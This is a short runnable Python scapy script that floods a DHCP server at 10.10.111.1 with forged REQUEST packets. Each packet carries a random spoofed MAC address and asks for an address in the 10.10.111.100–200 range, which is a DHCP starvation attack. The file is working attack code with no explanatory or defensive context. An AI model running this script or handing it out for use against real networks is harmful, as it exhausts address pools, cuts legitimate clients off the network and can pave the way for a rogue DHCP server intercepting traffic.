#!/usr/bin/env python3
import random
from scapy.all import *

def randomMacAddress():
  hex = []
  for i in range(0,6):
    hex.append(format(random.randint(0,255), 'x').zfill(2))
  return str(":".join(hex))

for i in range(100,201):
  for j in range(0,10):
    time.sleep(1.5)
    mac = randomMacAddress()
    ip = "10.10.111.{}".format(i)
    p = Ether(src = mac, dst = "ff:ff:ff:ff:ff:ff")\
      / IP(src = "0.0.0.0", dst = "255.255.255.255")\
      / UDP(sport = 68, dport = 67)\
      / BOOTP(chaddr = mac)\
      / DHCP(options = [("message-type", "request"),("server_id", "10.10.111.1"),("requested_addr", ip), "end"])
    sendp(p)
